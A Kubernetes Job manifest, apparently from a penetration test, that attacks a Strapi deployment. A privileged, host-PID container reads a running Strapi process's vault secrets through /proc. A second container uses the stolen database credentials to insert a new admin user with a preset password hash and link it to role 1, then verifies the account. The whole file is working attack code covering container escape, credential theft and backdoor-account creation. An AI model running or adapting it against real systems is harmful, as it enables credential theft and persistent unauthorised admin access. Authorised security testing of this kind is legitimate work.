apiVersion: batch/v1
kind: Job
metadata:
  name: dbq3
  namespace: pentest-1148
  labels:
    purpose: pentest-1148
spec:
  backoffLimit: 0
  ttlSecondsAfterFinished: 86400
  template:
    metadata:
      labels:
        purpose: pentest-1148
    spec:
      serviceAccountName: probe
      restartPolicy: Never
      nodeName: anubis-gateway-chatly-3akkk1
      hostPID: true
      volumes:
      - name: shared
        emptyDir: {}
      containers:
      - name: reader
        image: busybox:1.36
        securityContext:
          privileged: true
          runAsUser: 0
        volumeMounts:
        - name: shared
          mountPath: /shared
        command: ["/bin/sh","-c"]
        args:
        - |
          for p in /proc/[0-9]*; do
            cmd=$(tr '\0' ' ' < $p/cmdline 2>/dev/null)
            case "$cmd" in
              *strapi.js*start*)
                cat $p/root/vault/secrets/config > /shared/config.env 2>/dev/null
                echo "reader: pid ${p#/proc/}" > /shared/reader.log
                break
                ;;
            esac
          done
          sleep 150
      - name: psql
        image: postgres:16-alpine
        volumeMounts:
        - name: shared
          mountPath: /shared
        command: ["/bin/sh","-c"]
        args:
        - |
          for i in $(seq 1 90); do [ -s /shared/config.env ] && break; sleep 2; done
          cat /shared/reader.log
          . /shared/config.env
          export PGPASSWORD="$DATABASE_PASSWORD" PGHOST="$DATABASE_HOST" PGPORT="$DATABASE_PORT" PGDATABASE="$DATABASE_NAME" PGUSER="$DATABASE_USERNAME" PGSSLMODE=require
          echo "##DOCFMT"
          psql -Atc "select 'DOCFMT|'||id||'|'||coalesce(document_id,'NULL') from admin_users order by id limit 3" 2>&1
          echo "##CLEANUP_OWN"
          psql -Atc "delete from admin_users_roles_lnk where user_id in (select id from admin_users where email='i1273-pentest@example.com'); delete from admin_users where email='i1273-pentest@example.com';" 2>&1
          echo "##INSERT"
          psql -Atc "insert into admin_users (document_id,firstname,lastname,username,email,password,is_active,blocked,prefered_language,created_at,updated_at,published_at,locale) values (substr(md5(random()::text||clock_timestamp()::text),1,24),'Pentest','I1273','i1273pentest','i1273-pentest@example.com','$2b$10$jTXyGIFe680JwAKVo6PjqOLCJm8op3BI35qnoA/9A2U.H4RFgK8LK',true,false,'en',now(),now(),now(),null) returning 'NEWID|'||id||'|'||document_id" 2>&1
          echo "##LINK"
          psql -Atc "insert into admin_users_roles_lnk (user_id,role_id,role_ord,user_ord) select id,1,1,1 from admin_users where email='i1273-pentest@example.com' returning 'LNK|'||user_id||'|'||role_id" 2>&1
          echo "##VERIFY"
          psql -Atc "select 'USER|'||id||'|'||document_id||'|'||email||'|active='||is_active||'|blocked='||blocked from admin_users where email='i1273-pentest@example.com'" 2>&1
          psql -Atc "select 'ROLE|'||l.user_id||'|'||r.code from admin_users_roles_lnk l join admin_roles r on r.id=l.role_id where l.user_id=(select id from admin_users where email='i1273-pentest@example.com')" 2>&1
          echo "##DONE"
